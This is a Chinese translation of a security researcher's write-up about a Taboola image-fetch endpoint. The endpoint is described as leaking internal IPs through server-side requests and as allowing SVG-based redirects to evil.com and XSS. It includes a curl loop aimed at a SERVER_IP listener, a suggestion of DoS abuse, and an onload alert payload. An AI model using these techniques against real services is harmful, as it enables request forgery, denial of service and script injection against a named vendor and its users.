<html>
<head>
<title>A juicy endpoint on the Taboola leads to reveal internal IPs and XSS</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Taboola上的一个有趣的端点揭示了内部IPs和XSS</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/a-juicy-endpoint-on-the-taboola-leads-to-reveal-internal-ips-and-xss-d136364a6fb?source=collection_archive---------3-----------------------#2020-09-03">https://infosecwriteups.com/a-juicy-endpoint-on-the-taboola-leads-to-reveal-internal-ips-and-xss-d136364a6fb?source=collection_archive---------3-----------------------#2020-09-03</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="0b51" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我通常每天都会阅读关于安全的新闻，其中一个网站是<a class="ae kl" href="https://www.zdnet.com/" rel="noopener ugc nofollow" target="_blank"> ZDNet </a>。在页面底部有一个由Taboola推荐广告的空间。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi km"><img src="../Images/a1158da48f73231913cd99c25c6403b8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cymRm0K5hh3_3oYzqDIjvA.png"/></div></div></figure><p id="b65e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">作为一个安全爱好者，我总是尽可能地看一看😁</p><p id="d956" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">只需右击广告，通过<strong class="jp ir">检查元素</strong>找到一个有趣的端点。端点从Taboola CDN获取图片。</p><pre class="kn ko kp kq gt ky kz la lb aw lc bi"><span id="5f4d" class="ld le iq kz b gy lf lg l lh li"><a class="ae kl" href="https://images.taboola.com/taboola/image/fetch/" rel="noopener ugc nofollow" target="_blank">https://images.taboola.com/taboola/image/fetch/</a></span></pre><p id="cfa1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果您在此端点后插入外部URL图像，Taboola服务器将处理并显示该图片。Taboola不会检查图片是否来自CDN！</p><p id="adb1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果我通过这个端点从Taboola向我服务器发送一个请求，会发生什么？于是我就做了，找到了Taboola内部IPs。</p><p id="5458" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我已经通过以下命令准备好了我的服务器，用于监听端口8000</p><pre class="kn ko kp kq gt ky kz la lb aw lc bi"><span id="1d97" class="ld le iq kz b gy lf lg l lh li">python -m SimpleHTTPServer 8000</span></pre><p id="07b9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">并通过以下代码从我的PC向服务器发送多个请求:</p><pre class="kn ko kp kq gt ky kz la lb aw lc bi"><span id="2e44" class="ld le iq kz b gy lf lg l lh li">for number in {1..100}<br/>do curl -i <a class="ae kl" href="https://images.taboola.com/taboola/image/fetch/http://{target" rel="noopener ugc nofollow" target="_blank">https://images.taboola.com/taboola/image/fetch/http://S</a>ERVER_IP:8000/$number<br/>done</span></pre><p id="7d45" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">反应非常惊人！！！</p><p id="6772" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Taboola使用快速CDN，每当你ping images.taboola.com<strong class="jp ir"/>时，你会收到以下响应:</p><pre class="kn ko kp kq gt ky kz la lb aw lc bi"><span id="3810" class="ld le iq kz b gy lf lg l lh li">ping images.taboola.com<br/>PING tls13.taboola.map.fastly.net (151.101.193.44) 56(84) bytes of data.</span></pre><p id="55d6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是我找到了亚马逊的内部IP！！！</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi lj"><img src="../Images/eac74fbdfcf3fc8430d0c3a0248ffb02.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tteSLV9OfuSsNkk0RuajWw.png"/></div></div></figure><p id="c007" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以，有了这个有趣的端点，你可以代表Taboola服务器运行DOS攻击。</p><p id="3ea4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">此外，这些服务器在22和80上有开放端口，其中一个服务器上有两个CVE。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi lk"><img src="../Images/4070cfe315855d29df0537c707800413.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sbPavcKbOwvnWq4LlJpH-g.png"/></div></div></figure></div><div class="ab cl ll lm hu ln" role="separator"><span class="lo bw bk lp lq lr"/><span class="lo bw bk lp lq lr"/><span class="lo bw bk lp lq"/></div><div class="ij ik il im in"><p id="7e5e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">也许您认为这个端点处理图像并接受SVG图像😉</p><p id="710e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">找到一个SVG图像，用文本编辑器打开它。添加以下代码并上传到互联网上。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi ls"><img src="../Images/ef7243111679a1a1139c3c93e0dab6d2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bsZiIzY2WqnCD58yhJrnoQ.png"/></div></div></figure><p id="940c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后，我们有这个链接:</p><pre class="kn ko kp kq gt ky kz la lb aw lc bi"><span id="71a4" class="ld le iq kz b gy lf lg l lh li"><a class="ae kl" href="https://images.taboola.com/taboola/image/fetch/https://www.linkpicture.com/q/dog.svg" rel="noopener ugc nofollow" target="_blank">https://images.taboola.com/taboola/image/fetch/<strong class="kz ir">https://www.linkpicture.com/q/dog.svg</strong></a></span></pre><p id="fde8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">不幸的是，端点不能正确处理SVG图像，浏览器将下载该文件。但如果你使用Chrome或IE浏览器，点击下载的图片打开图片，你会重定向到<strong class="jp ir">evil.com</strong></p><p id="5eda" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您可以将SVG文件中的有效负载更改为以下代码来执行XSS:</p><pre class="kn ko kp kq gt ky kz la lb aw lc bi"><span id="4bc6" class="ld le iq kz b gy lf lg l lh li">onload='alert("XSS")'</span></pre><figure class="kn ko kp kq gt kr"><div class="bz fp l di"><div class="lt lu l"/></div></figure></div><div class="ab cl ll lm hu ln" role="separator"><span class="lo bw bk lp lq lr"/><span class="lo bw bk lp lq lr"/><span class="lo bw bk lp lq"/></div><div class="ij ik il im in"><p id="0980" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我已经在Taboola上发现了这些bug，并在2020年3月给支持团队发了邮件。他们到现在才回复我！</p></div><div class="ab cl ll lm hu ln" role="separator"><span class="lo bw bk lp lq lr"/><span class="lo bw bk lp lq lr"/><span class="lo bw bk lp lq"/></div><div class="ij ik il im in"><p id="926d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我的推特:<a class="ae kl" href="https://twitter.com/seqrity9" rel="noopener ugc nofollow" target="_blank">https://twitter.com/seqrity9</a></p></div></div>    
</body>
</html>